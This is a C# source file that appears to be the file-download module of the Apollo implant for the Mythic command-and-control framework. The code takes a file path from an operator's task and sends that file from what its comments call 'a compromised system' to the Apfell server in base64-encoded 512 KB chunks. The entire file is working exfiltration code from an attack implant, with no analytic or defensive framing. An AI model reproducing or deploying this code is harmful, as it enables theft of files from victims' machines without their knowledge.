#define COMMAND_NAME_UPPER

#if DEBUG
#undef DOWNLOAD
#define DOWNLOAD
#endif


#if DOWNLOAD
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Mythic.Structs;
using Apollo.Jobs;
using Apollo.MessageInbox;
using Apollo.Tasks;
/// <summary>
/// This task will download a file from a compromised system to the Apfell server
/// </summary>
namespace Apollo.CommandModules
{
    public class Download
    {
        /// <summary>
        /// Download a file to the remote Apfell server.
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. 
        /// File to download is in job.Task.parameters
        /// </param>
        /// <param name="implant">Agent this task is run on.</param>
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            string filepath = task.parameters;
            string strReply;
            bool uploadResponse;
            try // Try block for file upload task
            {
                // Get file info to determine file size
                FileInfo fileInfo = new FileInfo(filepath);
                long size = fileInfo.Length;
                
                // Determine number of 512kb chunks to send
                long total_chunks = size / 512000;
                // HACK: Dumb workaround because longs don't have a ceiling operation
                if (total_chunks == 0)
                    total_chunks = 1;
                
                // Send number of chunks associated with task to Apfell server
                // Response will have the file ID to send file with
                ApolloTaskResponse registrationMessage = new ApolloTaskResponse()
                {
                    task_id = task.id,
                    total_chunks = total_chunks,
                    full_path = fileInfo.FullName
                };

                job.AddOutput(registrationMessage);
                MythicTaskResponse resp = (MythicTaskResponse)Inbox.GetMessage(job.Task.id);
                
                if (resp.file_id == "")
                {
                    job.SetError(String.Format("Did not parse a file_id from the server response. Server reply was:\n\t{0}", resp.ToString()));
                    return;
                }

                // Send file in chunks
                for (int i = 0; i < total_chunks; i++)
                {
                    byte[] chunk = null;
                    long pos = i * 512000;

                    // We need to use a FileStream in case our file size in bytes is larger than an Int32
                    // With a filestream, we can specify a position as a long, and then use Read() normally
                    using (FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fs.Position = pos;

                        // If this is the last chunk, size will be the remaining bytes
                        if (i == total_chunks - 1)
                        {
                            chunk = new byte[size - (i * 512000)];
                            int chunkSize = chunk.Length;
                            fs.Read(chunk, 0, chunkSize);
                        }
                        // Otherwise we'll read 512kb from the file
                        else
                        {
                            chunk = new byte[512000];
                            fs.Read(chunk, 0, 512000);
                        }
                    }

                    // Convert chunk to base64 blob and create our FileChunk
                    ApolloTaskResponse fc = new ApolloTaskResponse()
                    {
                        chunk_num = i + 1,
                        file_id = resp.file_id,
                        task_id = job.Task.id,
                        chunk_data = Convert.ToBase64String(chunk),
                        total_chunks = -1
                    };
                    
                    job.AddOutput(fc);
                }
                job.SetComplete($"Finished downloading file {filepath}");
            }
            catch (Exception e) // Catch any exception from file upload
            {
                job.SetError($"Exception occurred while downloading file: {e.Message}");
            }

        }
    }
}
#endif